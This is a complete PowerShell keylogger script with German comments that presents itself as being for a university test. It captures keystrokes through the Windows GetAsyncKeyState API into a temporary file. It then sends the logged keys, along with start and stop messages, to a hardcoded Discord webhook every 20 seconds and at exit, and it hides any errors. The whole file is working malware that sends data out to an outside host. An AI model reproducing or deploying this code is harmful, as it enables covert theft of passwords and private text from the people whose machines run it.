# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$logFile = "$env:TEMP\key.log"
$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }
    foreach ($char in 32..126) {
        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
            Add-Content -Path $logFile -Value ([char]$char)
        }
    }
    if ((Get-Date).Second % 20 -eq 0) {
        if (Test-Path $logFile) {
            $keylog = Get-Content $logFile -Raw
            if ($keylog.Trim().Length -gt 0) {
                try {
                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
                } catch {}
                Clear-Content $logFile
            }
        }
        Start-Sleep -Seconds 1
    } else {
        Start-Sleep -Milliseconds 40
    }
}
if (Test-Path $logFile) {
    $keylog = Get-Content $logFile -Raw
    if ($keylog.Trim().Length -gt 0) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Clear-Content $logFile
    }
}
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}
